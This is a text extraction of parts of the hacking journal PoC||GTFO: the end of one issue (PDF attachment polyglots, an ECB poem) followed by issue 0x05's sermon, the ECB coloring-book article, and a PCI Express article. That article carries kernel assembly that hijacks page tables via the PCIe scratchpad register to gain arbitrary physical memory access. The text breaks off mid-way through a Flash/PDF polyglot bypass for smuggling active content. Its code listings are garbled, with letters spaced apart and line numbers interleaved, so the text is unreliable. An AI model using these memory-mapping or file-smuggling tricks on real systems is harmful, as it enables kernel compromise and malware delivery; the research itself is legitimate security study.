Of course, we could use Adobe software to attach the feelies, but this is not the Way of the PoC. Instead,
we’ll use our trusty pdflatex(1).
Pdflatex allows us to directly create our own PDF objects from the TeX source, whether they are stream
or standard objects. For Adobe tools to see a PDF attachment, we need to create 3 objects:
• the stream object with the attached file contents;
• a file specification object with the filename used in the document;
• an annotation object with the /FileAttachment subtype.
21 Some alarmist neighbors predict that the Universe will gravitationally collapse upon itself due to uncontrolled PoCkGTFO
expansion. Fear not, neighbors: an international action on PoC footprint is coming! On a second thought, though, since you
are all Merchants of Dire PoC now, maybe fear twice as hard? –PML
44There are a couple of things to keep in mind. First, Adobe Reader refuses to extract attachments with
a ZIP extension, so we’ll need to use a different one. For the plain old unzip still to work on the resulting
PDF file (after a couple of fixes), we must make sure our attachment is stored in the PDF byte-for-byte,
without additional PDF compression.
Here is the code we need. Note that after creating our PDF objects, we can refer to them via \pdflastobj;
to output the actual value, we prepend that reference with the \the keyword.
\begingroup
\pdfcompresslevel=0\relax
\immediate\pdfobj stream
attr {/Type /EmbeddedFile} file {feelies.zip}
\immediate\pdfobj{<<
/Type /Filespec
/F (feelies.zip.pdf) /EF <</F \the\pdflastobj\space 0 R>>
>>}
\pdfannot{
/Subtype /FileAttachment /FS \the\pdflastobj\space 0 R
/F 2 % Flag: Hidden
}
\endgroup
Finally, for some reason Adobe software fails to see an annotation object when it’s the last one in the
file. To work around this, we’ll just have to make sure we have some text after that object.
12.1
Increasing compatibility
Sadly, after we use this method and put the (extension-renamed) ZIP into PDF as a standard attachment,
plain old unzip will fail to unpack it. To unzip, the file doesn’t look like a valid archive: the actual ZIP
contents are neither located near the start of the file (because it’s a TrueCrypt polyglot) nor at the end
(because our document is big enough so the XREF table is bigger than the usual 64Kb threshold). Let’s
help unzip to find the ZIP structures again!
Luckily, this is easy to do. All we need is to duplicate the last structure of the ZIP file—the End of
Central Directory—which points to the body, the Central Directory. This structure is just 22 bytes long, so
it won’t make a big difference. When duplicating, we change the offset to the Central Directory so that it’s
pointing to the correct place in the PDF body. We then need to adjust the offsets in each directory entry
so that our files’ data is still reachable—and voilà, we have an attachment that is visible both to the fancy
Adobe tools and to the good old classic unzip!
4513
Ode to ECB
by Ben Nagy
Oh little one, you’re growing up
You’ll soon be writing C
You’ll treat your ints as pointers
You’ll nest the ternary
You’ll cut and paste from github
And try cryptography
But even in your darkest hour
Do not use ECB
CBC’s BEASTly when padding’s abused
And CTR’s fine til a nonce is reused
Some say it’s a CRIME to compress then encrypt
Or store keys in the browser (or use javascript)
Diffie Hellman will collapse if hackers choose your g
And RSA is full of traps when e is set to 3
Whiten! Blind! In constant time! Don’t write an RNG!
But failing all, and listen well: Do not use ECB
They’ll say “It’s like a one-time-pad!
The data’s short, it’s not so bad
the keys are long—they’re iron clad
I have a PhD!”
And then you’re front page Hacker News
Your passwords cracked—Adobe Blues.
Don’t leave your penguin showing through,
Do not use ECB
464714
A Call for PoC
by Pastor Manul Laphroaig
Howdy, neighbor! Is that a fresh new PoC you are hugging so close? Don’t stifle it, neighbor, it’s time
for it to see the world, and what better place to do it than from the pages of the famed International Journal
of PoC or GTFO? It will be in a merry company of other PoCs big and small, bit-level and byte-level, raw
binary or otherwise, C, Python, Assembly, hexdump or any other language. But wait, there’s more—our
editors will groom it for you, and dress it in the best Sunday clothes of proper church English. And when it
looks proudly back at you from these pages, in the company of its new friends, won’t that make you proud?
So set that little PoC free, neighbor, and let it come to me, pastor@phrack org!
14.1
PoC Contributions
Do this: Write an email telling our editors how to do reproduce *ONE* clever, technical trick from your
research. If you are uncertain of your English, we’ll happily translate from French, Russian, or German.
Like an email, keep it short. Like an email, you should assume that we already know more than a bit
about hacking, and that we’ll be insulted or—WORSE!—that we’ll be bored if you include a long tutorial
where a quick reminder would do. Don’t try to make it thorough or broad.
Do pick one quick, clever low-level trick and explain it in a few pages. Teach me something about file
formats that even Ange Albertini doesn’t already know; teach me how to make an image that’s invisible
at high resolution but at low resolution is exposed by dithering; or, teach me that an old exploitation trick
still works on QNX. Show me how to emulate Atlas’s RFCat as a GNURadio block. Don’t tell me that it’s
possible; rather, teach me how to do it myself with the absolute minimum of formality and bullshit.
Like an email, we expect informal (or faux-biblical) language and hand-sketched diagrams. Write it in a
single sitting, and leave any editing for your poor preacherman to do over a bottle of fine scotch. Send this
to pastor@phrack.org and hope that the neighborly Phrack folks—praise be to them!—aren’t man-in-the-
middling our submission process.
You can expect PoCkGTFO 0x05, our sixth release, to appear in print soon at a conference of good
neighbors. We’ve not yet decided whether to include crayons, but you can be damned sure that it’ll be a
good read.
48PoC k GTFO;
addressed to the
INHABITANTS
of
EARTH
on the following and other
INTERESTING SUBJECTS
written for the edification of
ALL GOOD NEIGHBORS
August 10, 2014
5:2 A Sermon Celebrating Hacker Privilege 5:8 A Second RDRAND Backdoor
5:3 Electronic Coloring Books 5:9 Cisco KVM Exploits
5:4 Reflecting the Page Tables over PCI Express 5:10 Shellcode that is its own NOP Sled
5:5 How to make a Flash PDF Polyglot 5:11 Rosetta Stone for SWF in ASCII
5:6 SMP in 512 Bytes 5:12 Polyglots from SHA1 Collisions
5:7 PCIe over USB 5:13 Ben Nagy’s Latest Poem
–——–
———
—–—–
———
–—–
LAS VEGAS, NV:
Published at Considerable Financial Loss by the
Tract Association of PoCkGTFO and Friends,
to be Freely Distributed to all Good Readers,
and to be Freely Copied by all Good Bookleggers.
0, $0, £0. Самиздат. pocorgtfo05.pdf.
1
——–
—
––—–
———Legal Note: Permission to use all or part of this work for personal, classroom or any
other use is granted without fee provided that you print books instead of burning them.
The easiest way to fulfill the second clause would be to print a few copies of this fine journal
on your office’s laser jet to share with friends, but printing other books is just as fine and
dandy by us.
Reprints: This issue is published through samizdat as pocorgtfo05.pdf. You might
want to risk counting upward from pocorgtfo00.pdf to get our other issues, but don’t
blame us if you wind up at RenditionCon.
Technical Note: This issue is a polyglot that can be meaningfully interpreted as a
PDF, SWF, ZIP, or ISO file. The PDF is a good read; the SWF will never give you up or
let you down; the ZIP contains all our prior issues; and, to top it all off, the ISO boots to
a friendly game of Tetris.
Printing Instructions: Pirate print runs of this journal are most welcome, but please do it properly! PoCkGTFO
is to be printed duplex, then folded and stapled in the center. Print on A3 paper in Europe and Tabloid (11” x 17”)
paper in Samland. Canadians will probably use the paper of their southern neighbor, but secret government labs in
Canada may use P3 (280 mm x 430 mm) if regulations demand it. If possible, the outermost sheet should be on
thicker paper to form a cover.
1 # This i s how t o c o n v e r t an i s s u e f o r d u p l e x p r i n t i n g .
sudo apt−g e t i n s t a l l pdfjam
3 pdfbook −−s h o r t −edge p o c o r g t f o 0 5 . p d f −o p o c o r g t f o 0 5 −b o o k l e t . p d f
Bossy Pants
Unfinished Article
Ethics Advisor
Poet Laureate
Editor of Last Resort
Drafted for Hard Labor
Funky File Formats Polyglot
Minister of Spargelzeit Weights and Measures
2
Reverend Doctor Pastor Manul Laphroaig
Michael Ossmann
The Grugq
Ben Nagy
Melilot
Jacob Torrey
Ange Albertini
FX1
Call to Worship
Neighbors, please join me in reading this sixth issue of the International Journal of Proof of Concept or Get
the Fuck Out, a friendly little collection of articles for ladies and gentlemen of distinguished ability and taste
in the field of software exploitation and the worship of weird machines. If you are missing the first five issues,
we the editors suggest pirating them from the usual locations, or on paper from a neighbor who picked up
a copy of the first in Vegas, the second in São Paulo, the third in Hamburg, the fourth in Heidelberg, or the
fifth in Montréal. This being our second epistle to Las Vegas, we wish you the best in that den of iniquity.
We open with a sermon to neighbors far and wide on one of the most preached-upon subjects of our
times. Hacker Privilege, neighbor—do you have it?
In Section 3, Philippe Teuwen continues our journal’s strange obsession with ECB mode antics. You see,
there’s a teensy little bit of intellectual dishonesty in the famous ECB Penguin, in that the data is encrypted
but the metadata is kept in the clear, so there’s no question as to the dimensions of the image. To amend
this travesty, Philippe has composed a series of scripts for turning an ECB-encrypted image into a coloring
book puzzle, by automatically correcting the dimensions, applying a best-guess set of false colors, and then
walking a human operator through choosing a final set of colors.
In Section 4, Jacob Torrey shares a quirky little PoC easter egg that relies on the internals of PCI Express
on recent x86 machines. By reflecting traffic through the PCI Express bus, he’s able to map the x86’s virtual
memory page table into virtual memory!
Section 5 explains the trick by Alex Inführ that makes a PDF file that is also an SWF file. We only hope
that if Adobe decides—yet again!—to break compatibility with our journal after publication, that they at
least be polite enough to whitelist this file or cite this article.
Shikhin Sethi continues his series of x86 proofs of concept that fit in a 512 byte boot sector. In this
installment, he explains how the platform’s interrupts and timers work, then finishes with support for
multiple CPUs. It’s in Section 6.
Joe FitzPatrick shares some more PCI Express wisdom in Section 7, presenting a breakout board for the
Intel Galileo platform that allows full-sized cards to be plugged into the Mini-PCIe slot of this little guy.
In Section 8, Matilda puts her own spin on Taylor Hornby’s RDRAND backdoor that you’ll recall from
PoCkGTFO 3:6. Whereas he was peeking on the stack in order to sabotage Linux’s random number gener-
ation, she instead uses the RDRAND instruction to leak encrypted bytes from kernel memory. A userland
process can then decrypt these bytes in order to exfiltrate data, and anyone without the key will be unable
to prove that anything important is being leaked.
In Section 9, neighbor Mik will guide you from spotting an unknown protocol to a PoC that replaces a
physical disk in a remote server’s CD-ROM with your own image, over an unencrypted custom KVM session.
Bolt-on cryptography is bad, m’kay?
Section 10 presents a nifty alternative to NOP sleds by Brainsmoke. The idea here is that instead wasting
so much space with nop instructions, you can instead load a canary into a register at the beginning of your
shellcode, branching back to the beginning if that canary isn’t found at the end.
In Section 11, we have Michele Spagnuolo’s Rosetta Flash attack for abusing JSONP. While surely you’ve
heard about this in the news, please ignore that Google and Tumblr were vulnerable. Instead, pay attention
to the mechanism of the exploit. Pay attention to how Michele abuses a decompression routine to produce
an alphanumeric payload, which in isolation would be a worthy PoC!
We all know that hash-collision vulns can be exploited, but the exact practicalities of how to do the
exploit or where to look for a vuln aren’t as easy to come by. That’s why, in Section 12, Ange Albertini and
Maria Eichlseder teach us how to write sexy hash-collision PoCs. When a directory of funky file formats
teams up with a cryptographer, all sorts of nifty things are possible.
In Section 13, Ben Nagy gives us his take on Coleridge’s masterpiece. Unfortunately, to comply with the
Wassenaar Arrangement on Export Controls for Conventional Arms and Dual-Use Goods and Technologies,
this poem is redacted from our electronic edition.
Finally, in Section 14, we do what churches do best and pass around the donation plate. Please contribute
any nifty proofs of concept so that the rest of us can be enlightened!
32
Stuff is broken, and only you know how
by Rvd. Dr. Manul Laphroaig
Gather around, neighbors. We will talk of science and pwnage, and of how lucky we are that our science
is (mostly) pwnage, and our pwnage is (mostly) science.
I say that we are lucky, and I mean it, despite there being no lack of folks who look at us askance and would
like to build pretty bonfires out of our tools or to set “regulators” upon us to stand over our shoulders while
we work (weird reprobates as we are, surely some moral supervision from straight-and-narrow bureaucrats
will do us good!)
But consider the bright and wonderful subject-matter we work on. An exploit is like a natural law:
either it works, here and now, or it’s bullshit. Imagine our incredible luck, neighbors: in order to find out
something clever about the world, we just need to run a program! Then, if it works, we know immediately
that this is how things work. It’s even better than proving a theorem, because every mathematician knows
that an exciting freshly-baked proof might contain a mistake; but with a root shell there can be no mistake.
Indeed, few are so privileged to discover natural laws just by phrasing them right! 1
Now while we puzzle out the secrets of unexpected machines inside machines, other neighbors are after
other secrets of the universe, human life, and everything—and consider their plight! One day there’s a
promise of insight into the biochemical mechanisms that make humans selfish or hypocritical—from not just
a professor of a respected university, but a Dean 2 of such. This is a huge and unexpected step forward,
and even newspapers like The New York Times write about it. That research connected selfishness with
meat-eating. The connection seemed a bit too simplistic, but sometimes Nature does favor simple answers.
Now this is knowledge, neighbor, and you had to work it in—except, as it turns out, it’s likely bullshit, just
as the Dean Diederik Stapel’s entire career, built on his many “scientific studies” of record was bullshit (look
him up in Wikipedia, neighbor!). It was bullshit made up to play on educated people’s stereotypes, to make
headlines, to be featured in the Times of New York and of LA, and it totally worked for over a decade. It
would’ve worked longer, too, if the fraud wasn’t aiming so high so fast.
Imagine the plight of all the students, underlings, colleagues, and co-authors—all victims of Stapel’s
bullshit—who have wasted time building their careers on his crock of bullshit as if it were true insights into
what makes humans tick. Some may have had their own research papers rejected by peer reviewers for not
having cited Stapel’s flagship results—which were, as you recall, accepted science for over ten years.
Verily I tell you, neighbors, we are so much more fortunate, for in the domain we call ours truth runs and
pwns, and bullshit doesn’t run and doesn’t pwn, and nothing can be built on top of bullshit in good faith or
in bad faith that would stand to even casual scrutiny. (Well, possibly nothing other than a VC pitch—but
judge and be judged, neighbors.) We may be distracted from pwnage by one too many debates, but at least
none of these debates are about something called “replication bullying.” If you think this is funny, neighbor,
consider that this is a real term, taken from complaints by actual and successful professional scientists.
These complaints are about some other scientists who staged the same experiments without involving the
original authors and published a paper about how they failed to replicate the original findings. They call
this “bullying”, neighbor, and you might want to remember this when you hear that “scientists have shown
X” or “linked X and Y.” Verily I tell you, even the hallowed halls of science, blessed with peer-review, are no
refuge from bullshit.
We have another tremendous bit of luck, neighbors. In our domain of knowledge, whether 75%, or 99%,
or 99.99% of us agree, paid or unpaid, expert or amateur, industry or academic—means nothing. Let me
repeat, the consensus of all of us taken together—for whatever definitions of “all” and “together”—means
exactly nothing. We may all be wrong, and whoever comes up with an exploit will be right, and that will be
that. It happened before, and it will all happen again. We progress by someone noticing what the rest of us
1 This
turn of phrase has been shamelessly stolen from Meredith L. Patterson’s essay “When nerds collide”, where she writes
about our strange tribe of people brought together by the power to translate pure thought into actions that ripple across the
world merely by the virtue of being phrased correctly—but that is another story.
2 “Leaps tall buildings in a single bound”—look it up on the internets under “academic structure”, neighbor! The only finer
bit of college-land folklore is the one that starts with “Biologists think they are biochemists,. . . ”, and it is mostly found pinned
to doors of rather squalid-looking offices around math departments.
4have overlooked to date, and if some group of people started counting our publications to learn something
about security of computers, we’d tell them to stop wasting their time and ours. Pwnage laughs at majority
vote and “consensus”—for these two are, in fact, flagstones on the royal road to being royally pwned.
Is this luck undeserved and unfair, as some would like us to believe? Not so. It is like the luck of a
fisherman that he has to spend time on the water, or maybe the luck of a fish that has to live in the water;
or the luck of a hunter that he needs to hang out where Mother Nature is constantly munching upon herself.
(Stand quietly some late afternoon in a summer meadow, watch dragonflies zip back and forth, and listen.
You are hearing the sound of a million lunches, neighbor!)
We see through bullshit because we hunt in its fields and jungles, and we know that wherever there is
bullshit that’s where stuff will be badly pwned. Bullshit and pretending that things are understood when
they are not are like a watering hole in a parched steppe; ecologies of breakage are ecologies of bullshit and
pretense. A good hunter knows to pay attention to the watering holes.
Some of us are hunters of bullshit, others care more about bullshit sneaking into their villages at night,
carrying away a pet project here, a young ’un there. But no matter whether a hunter or a guardian, one
knows the beast, and where the beast comes from. However you reckon the number of the beast, you all
know the names of the beast: Bullshit and Pretense.
Paul Phillips, who walked away after having written a million lines of code for Scala and having closed
nine hundred bugs, got to the bottom of this. He spoke of deliberate lies that stayed in the documentation
for over three years, as an attempt to make things look less complicated, but in reality making it hard for
programmers to be sure whether a bug was in their program or in the language itself:
This is the message it sends: your time is worthless. . . . I don’t want to be a part of something
that thinks your time is worthless.
[. . . ]
It’s too complicated, people say it’s too complicated—let’s just not let them see that complicated
thing. . . . They told me I’d never have to know. Well, obviously, you do have to know, there’s no
way to avoid knowing. It’s only a question of how much you are going to suffer in the course of
acquiring this knowledge.
That is a fine sermon against the kind of engineering that ends in bullshit and pretense, neighbors, but
it also reveals a deep truth about us. We don’t want to be a part of things that treat people’s time as
worthless. More to the point, we cannot stand such things, we simply cannot operate where they rule. We
fight, we flee, or we walk away, but in the end we are by and large a community of refugees with an allergy
to bullshit.
In the end, neighbors, our privilege may just be an allergy, an allergy to useless waste of time and busy
work that makes no sense and brings no improvement. We find ourselves in this oasis of no-bullshit we-don’t-
care-what-other-people-think reproducibility for a simple reason that has little to do with luck. We simply
fled here from the dark lands where Bullshit reigned supreme, where the very air was laden with its reek, and
where we would succumb to our allergy in fairly short order, but not before being branded as disagreeable,
lazy, or hubris-prone. We defied the gods of these places (which was what hubris originally meant), and we
are a nation of immigrants in our Chosen Vale of No-Bullshit.
Rejoice, then, and give a thought to neighbors who still suffer—and reach out to them with a good word,
a friendly PoC, or a copy of this fine journal when you feel extra neighborly! For your allergy to bullshit,
your hubris, your impatience, and your distaste for busy-work may make poor privilege, but that is what
we’ve got to share, and share it we shall.
Go now in pwnage, share your privilege, and help deliver neighbors from bullshit.
5Ange Albertini’s extensions to the ECB Penguin.
63
ECB as an Electronic Coloring Book
by Philippe Teuwen
Hey boys and girls, remember Natalie and Ben’s warnings in PoCkGTFO 4:13 about ECB? Forbidden
things are attractive, I know, I was young too. Let’s explore that area together so that you’ll have fun and
you’ll always remember not to use ECB later in your grown-up life.
But first of all let me clarify one thing: the ubiquitous ECB penguin is a kind of a fraud, brandished
like a scarecrow! The reality when you get an encrypted image in ECB mode is that you’ve no clue of its
characteristics, its size, its pixel representation. Let’s take another example than the penguin (as the source
image of this fraud seems to be lost forever). A wrong guess, such as assuming a square format, will render
just a meaningless bunch of static.
So to get the penguin back, the penguin’s author cheated and encrypted only the pixel values, but not
the description of the image, such as its size. Moreover he probably tried different keys until he got the
tuxedo as black as possible as he has no control on the encrypted result.
Does it mean ECB is not that bad? Don’t get me wrong, ECB is a very bad way to encrypt and we’ll
blow it apart. But what’s ECB? No need to understand the underlying crypto, just that the image is
being sliced in small pieces—sixteen bytes wide in case of AES-ECB—and each piece is replaced by random
garbage. Identical pieces are replaced by the same random data and if two pieces are different their respective
encrypted versions are too. That’s why we can distinguish the penguin.
But we can do much better; instead of displaying directly the mangled pixels we can paint them! We
know that identical blocks of random data represent the encrypted version of the same initial block of color,
so let’s pick a color ourselves and paint over those similar pieces. That’s what this little program does.
You’ll find it as ElectronicColoringBook.py by unzipping this PDF. 3 It also tries to guess the right ratio by
checking which one will give columns of pixels as coherent as possible.
$ ElectronicColoringBook.py test.bin
Already better! The lines are properly aligned but the image is too flat. That’s because we painted each
byte as one pixel but the original image was probably created with three bytes per pixel, so let’s fix that.
3 https://github.com/doegox/ElectronicColoringBook
7$ ElectronicColoringBook.py test.bin –pixelwidth=3
As we don’t know the original colors, the tool is choosing some randomly at each execution. Now that the
ratio and pixel width are correct we can observe vertical stripes. That’s what happens when you can’t have
an exact number of pixels in each block and that’s exactly the case here. We guessed that each pixel requires
three bytes and the blocks are 16-byte wide so if some pixels of the same color—let’s say #AABBCC—are
side by side we get three types of encrypted blocks.
1
3
5
AABBCCAABBCCAABBCCAABBCCAABBCCAA
BBCCAABBCCAABBCCAABBCCAABBCCAABB
CCAABBCCAABBCCAABBCCAABBCCAABBCC
AABBCCAABBCCAABBCCAABBCCAABBCCAA
BBCCAABBCCAABBCCAABBCCAABBCCAABB
etc
−>
−>
−>
−>
−>
81E49040C91E64A8F2EB52EB313EADF4
769 B3981E49040C9164A83B6CBFB12BF
12B4502017A19C0EB313EADF47638FB2
81E49040C91E64A8F2EB52EB313EADF4
769 B3981E49040C9164A83B6CBFB12BF
So we’ve got three types of encrypted data for the same color, repeating over and over. Still one last
complication: Pluto’s tail is visible on the left of the image, because before the encrypted pixels there is the
encrypted file header. So we’ll apply a small offset to skip it, and as before we’ll group blocks by three.
$ ElectronicColoringBook.py test.bin -p 3 –groups=3 –offset=1
And now let’s make it a real coloring book by choosing those colors ourselves! We’ll draw the ten most
frequent colors in white (#ffffff) and the remaining blocks, which typically contain all kinds of transitions
from one color area to another one, in black (#000000).
8$ ElectronicColoringBook.py test.bin -p 3 -g 3 -o 1 –palette=\
’#ffffff#ffffff#ffffff#ffffff#ffffff#ffffff#ffffff#ffffff#ffffff#ffffff#000000’
Kids, those colors are encoded with their RGB values. If this is confusing, ask the geekiest of your parents;
she can help you. Colors are sorted by largest areas, so let’s keep the white color for the background. Let’s
paint Pluto in orange (#fcb604) and Mickey’s head in black.
$ ElectronicColoringBook.py test.bin -p 3 -g 3 -o 1 -P \
’#ffffff#fcb604#000000#ffffff#ffffff#ffffff#ffffff#ffffff#ffffff#ffffff#000000’
If you don’t know which area corresponds to which color in the palette, just try it out with a flashy color.
Eventually, we wind up with something like this.
$ ElectronicColoringBook.py test.bin -p 3 -g 3 -o 1 -P \
’#ffffff#fcb604#000000#f9fa00#fccdcc#fc1b23#a61604#a61604#fc8591#97fe37#000000’
9Note to copyright owners:
We were careful to disclose only images encrypted with AES-256 and a random key that was
immediately destroyed. This should be safe enough, right?
Much better than the ECB penguin, don’t you think? So remember that ECB should really stand
for “Electronic Coloring Book.” They should therefore should be only used by kids to have fun, never by
grown-ups for a serious job!
Maybe Dad is wondering why we didn’t use a picture of Lenna as in any decent scientific paper about
image processing? Tell him simply that it’s for a coloring book, not Playboy! There are more complex
examples and explanations in the project directory. It’s even possible to colorize other things, such as
binaries or XORed images!
104
An Easter Egg in PCI Express
by Jacob Torrey
Dear Pastor Laphroaig,
Please consider the following submission to your church
newsletter. I hope you think it worthy of your holy parish-
ioners and readers.
Our friends at Intel are always providing Easter eggs for us
to enjoy, and having stumbled across a new one for x86, the
most neighborly option was naturally to share with all inter-
ested parties. This PoC is a weird quirk in which a newer x86
feature-set breaks invariants/security guarantees from older
version. Specifically, the newer PCI Express configuration
space access mechanism breaks virtual memory. Virtual mem-
ory is orchestrated by the CR3 register (storing the physical
address of the page tables) and the page tables themselves.
An issue with kernel shell-code and live memory forensics is
that unless the virtual address of the page tables is known, it
is impossible to map them (or any other physical address for
that matter) into virtual memory, resulting in a chicken-and-
egg problem. Luckily, most operating systems keep the page
tables at a known virtual address (0xC0000000 on many Win-
dows systems), but this Easter egg allows access to the page
tables on any OS.
In kernel space, CR3 can be read, providing the physical
address of the OS page tables; however, due to Intel’s virtual
memory protections, there is no way to create a recursive vir-
tual mapping to that physical address. All that is needed to do
so, is a way to write an arbitrary 32-bits (which will become a
PDE mapping in the page tables) to a known physical location.
This is the crux of the issue, and the security of virtual memory depends on it. Luckily, with the advent of
PCI Express, there is now the “Enhanced Configuration Access Mechanism” (ECAM), which shadows PCI
configuration space registers into physical memory at an address kept in the PCIEXPBAR register (D0:F0
offset: 0x60). This is typically enabled on all the systems the author has come across, but your mileage
may vary. With this ECAM, changes made to the configuration space via the legacy port I/O mechanism
(0xCF8/0xCFC) will be reflected in physical memory. Now all that is needed is a register in configuration
space that is at least 32-bits wide and can be changed to an arbitrary value without impacting the system.
Again, Intel is looking out for our church, and through their grace, they provide a “Scratchpad Data” register
(D0:F0 offset: 0xDC) that has no semantic meaning, just a location for software to store data. Now we have
the function ModifyPM() for physical memory. (This is for Windows 32-bit without PAE, running as driver
code.)
/∗ ∗
2
4
6
8
10
S e t s up t h e PDE t o map i n t h e r e a l PDT u s i n g t h e MMIO r a n g e s o f PCI
Configuration space
@return The PCIEXPBAR f o r comparison
∗/
ULONG ModifyPM ( )
{
ULONG MMIORange = 0 ;
__asm
{
pushad
1112
// U t i l i z e t h e s c r a t c h pad r e g i s t e r as our mini−PDE
mov ebx , c r 3
and ebx , 0xFFC00000
// This i s g o i n g t o h o l d our new PDE ( The b i t s i n
// CR3 w i t h t h e l e a s t s i g n i f i c a n t s t u f f removed )
o r ebx , 0 x83
// P | RW | PS
14
16
18
mov dx , 0 x 0 c f 8
mov eax , 0x800000DC
out dx , eax
20
// O f f s e t 0 x37 (0xDC / 4)
22
mov dx , 0x0CFC
mov eax , ebx
out dx , eax // Write our PDE
24
26
// Determine where i n p h y s i c a l memory we can f i n d t h e PDE
mov dx , 0 x 0 c f 8
mov eax , 0 x80000060
out dx , eax
28
30
32
mov dx , 0x0CFC
i n eax , dx
mov MMIORange , eax // Save our v a l u e and BAM!
34
36
popad
}
38
i f (VDEBUG)
DbgPrint ( "MMIO Base Address : %x" , MMIORange) ;
40
42
return MMIORange ;
}
Once the scratchpad register is primed and ready, and the physical address of the ECAM is known, the
next step is to treat the register as a PDE mapping in the OS page tables to add a recursive mapping at a
known location.
1 /∗ ∗
3
5
7
9
11
S e t s up a r e c u r s i v e mapping t o t h e OS page d i r e c t o r y
I commented i t v e r y t h o r o u g h l y b e c a u s e i t ’ s q u i t e complex .
Basically it :
−> S a v e s t h e c u r r e n t ( r e a l ) CR3 v a l u e
−> C r e a t e s a new PDE t o map i n t h e ( r e a l ) PDT
−> C r e a t e s a v i r t u a l a d d r e s s u s i n g t h e ( f a k e ) PDE we i n s e r t e d i n ModifyPM
−> S w i t c h e s t o t h e ( f a k e ) CR3 and u t i l i z e s t h e c o n s t r u c t e d v i r t u a l
a d d r e s s t o i n s e r t t h e new r e c u r s i v e mapping i n t o t h e ( r e a l ) PDT
−> S w i t c h e s t h e CR3 b a c k and c o n t i n u e s on smugly
∗/
13 ULONG recurMap ( )
{
15
ULONG MMIORange = 0 ;
ULONG PDEBase = 0 ;
17
ULONG P DE o ff se t = 0 ;
19
21
23
// S e t s up t h e ( f a k e ) PDE and
MMIORange = ModifyPM ( ) ;
MMIORange &= 0 xF0000000 ;
i f (VDEBUG)
DbgPrint ( "Mapping PDT t o i t s e l f " ) ;
25
__asm {
1227 cli
29 pushad
31 33 // Save t h e c u r r e n t CR3, seems l i k e o v e r k i l l , b u t i t makes s e n s e
mov ebx , c r 3 // A copy t o u s e t o c o n s t r u c t our v i r t u a l a d d r e s s
mov ecx , c r 3 // Save a copy so we don ’ t mess up t h i n g s up t o o much
35 mov edx , MMIORange // Our new CR3 v a l
37 // S e t u p our v i r t u a l a d d r e s s
and ebx , 0x003FFFFF
// Gets us our o f f s e t i n t o s t u f f
o r ebx , 0x0DC00000
// R e f e r e n c e t h e PDE o f f s e t o f (0 x37 << 22)
// EBX s h o u l d now have our v i r t u a l a d d r e s s : )
39
41
43
// T e s t s t o s e e i f t h e PDE i s f r e e f o r u s e
test_pde :
45 add ebx , 0 x4 // O f f s e t t o unused PDE
47 // Keep t h e o f f s e t v a r up t o d a t e ( b u t u i n t 3 2 a l i g n e d , n o t u i n t 8 )
mov eax , P DE o ff se t
add eax , 0 x1
mov PDEoffset , eax
49
51
53
55
// ∗∗ ∗∗ ∗∗ ∗∗∗ ∗∗ ∗∗∗ ∗ BEGIN CRITICAL SECTION
mov cr3 , edx // I n j e c t our new CR3
mov eax , [ ebx ]
i n v l p g [ ebx ]
57
59
61
63
65
67
69
71
73
75
77
79
// Add our m i r t h f u l PDE e n t r y which s h o u l d map i n t h e PD
// I n v a l i d a t e s t h e v i r t u a l a d d r e s s we used j u s t i n
// c a s e i t c o u l d c a u s e l a t e r p r o b l e m s .
mov cr3 , e c x
// R e s t o r e e v e r y t h i n g n i c e l y
// ∗∗ ∗∗ ∗∗ ∗∗∗ ∗∗ ∗∗∗ ∗ END CRITICAL SECTION
cmp eax , 0 // Can we u s e t h i s e n t r y ?
j e i n j e c t _ p d e // Try t h e n e x t one
jmp t e s t _ p d e // Found an empty one , w00t !
// I n j e c t s our r e c u r s i v e PDE i n t o t h e PDT
inject_pde :
// S e t u p our r e c u r s i v e PDE ( a g a i n )
mov eax , c r 3 // A copy t o modify f o r our new r e c u r s i v e PDE
and eax , 0xFFC00000 // Only t h e most s i g n i f i c a n t b i t s s t a y f o r 4M p a g e s
o r eax , 0 x93 // P | RW | PS | PCD
// EAX now h o l d s t h e same PDE t o p u t i n t o t h e ’ r e a l ’ PDT
// ∗∗ ∗∗ ∗∗ ∗∗∗ ∗∗ ∗∗∗ ∗ BEGIN CRITICAL SECTION
mov cr3 , edx // I n j e c t our new CR3
mov [ ebx ] , eax
i n v l p g [ ebx ]
// Add our m i r t h f u l PDE e n t r y which s h o u l d map i n t h e PD
// I n v a l i d a t e s t h e v i r t u a l a d d r e s s we used j u s t i n
// c a s e i t c o u l d c a u s e l a t e r p r o b l e m s
mov cr3 , e c x
// R e s t o r e e v e r y t h i n g n i c e l y
// ∗∗ ∗∗ ∗∗ ∗∗∗ ∗∗ ∗∗∗ ∗ END CRITICAL SECTION
81
83
85
87
89
// Determine t h e v i r t u a l a d d r e s s o f t h e b a s e o f t h e PDT
// ( remembering t h e d i f f e r e n c e s i n a l i g n m e n t )
mov eax , c r 3 // A copy t o modify f o r our new r e c u r s i v e PDE
and eax , 0x003FFFFF // Only t h e most s i g n i f i c a n t b i t s s t a y f o r 4M p a g e s
mov ebx , PD E of fs e t
s h l ebx , 22 // O f f s e t i n t o t h e PDT
o r eax , ebx
mov PDEoffset , eax
91
13popad
93
sti
95 }
97 i f (VDEBUG)
DbgPrint ( "Mapping c o m p l e t e s h o u l d be mapped i n a t 0x%x ! " , PD E of fs e t ) ;
99
return P DE of f se t ;
101 }
The above, on a 32-bit non-PAE system, will return the virtual address that maps in the page directory
and allows you to map in arbitrary physical memory as a known location. It should be noted that kernel
privileges are needed (to access CR3) and to operate on a kernel page marked as Global so as to persist
through the CR3 changes. The author hopes you enjoyed this weird machine and remember to treat your
input data as formally as code, for only you can prevent vulnerabilities!
Sincerely,
@JacobTorrey
145
A Flash PDF Polyglot
by Alex Inführ
5.1
PDF and SWF Reunited
I had the idea of creating a nice little file, one which is both a valid PDF and a valid Flash file. Such a
polyglot can cause a lot of trouble, because they can smuggle active content like Flash in a harmless file
type, PDF. 4 The PDF format is a really good container format, because the Adobe PDF parser is not very
strict. The PDF header “%PDF-” does not have to be at offset 0; the parser will search the first 1017 bytes
for the header. Recently, however, Adobe decided to stop supporting PDF files that start either with CWS
or FWS at offset 0. Both are possible headers for a Flash file. This should make it harder to create such
polyglots.
5.2
Main File Structure
Unlike PDF, Flash files always need their header at offset 0. It is not possible to insert any data before it.
To fulfill this requirement, we need to find a way to bypass Adobe’s prohibition of Flash headers. The next
step requires the PDF header to be embedded in the first 1,017 bytes without destroying the Flash file. If
we meet all these requirements, we will be able to append the rest of the PDF data at the end of the file.
5.3
Bypassing the Header Restriction
The bypass was rather simple, all you have to do is open the SWF file format specification to page 27.
The specification mentions three possible headers: “FWS,” “CWS” and “ZWS”. The FWS is used for uncom-
